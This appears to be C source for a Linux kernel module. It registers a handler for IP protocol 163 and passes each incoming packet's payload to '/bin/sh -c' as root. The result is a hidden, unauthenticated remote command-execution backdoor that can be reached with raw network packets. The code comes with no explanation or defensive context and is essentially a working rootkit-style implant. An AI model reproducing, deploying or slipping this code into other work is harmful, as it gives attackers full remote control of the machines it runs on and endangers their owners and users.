#include <linux/module.h>
#include <net/protocol.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <net/ip.h>
#include <linux/workqueue.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");

static void shell_exec (struct sk_buff *skb) {
    char *envp[4] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin",  NULL};
    char *cmd[] = {"/bin/sh", "-c", skb->data, NULL};
    printk(KERN_INFO "About to run: %s, ", skb->data);
    call_usermodehelper(cmd[0], cmd, envp, UMH_WAIT_EXEC);
    kfree_skb(skb);
}



int exec_packet(struct sk_buff *skb) {
    const struct iphdr *iph;
    iph = ip_hdr(skb);

    printk(KERN_INFO "pkt_len: %d, ipv%d, hdr_len: %d ", skb->len, iph->version, iph->ihl);
    printk(KERN_INFO "s_ip: %pI4, ", &iph->saddr);
    printk(KERN_INFO "data: %s, ", skb->data);
    shell_exec(skb);

    printk("All done..");
    return 0;
}

static const struct net_protocol proto163_protocol = {
    .handler = exec_packet,
    .no_policy = 1,
    .netns_ok = 1
};

int init_module(void) {
    return (inet_add_protocol(&proto163_protocol, 163) < 0);
}


int destroy_module(void) {
    return (inet_del_protocol(&proto163_protocol, 163) < 0);
}
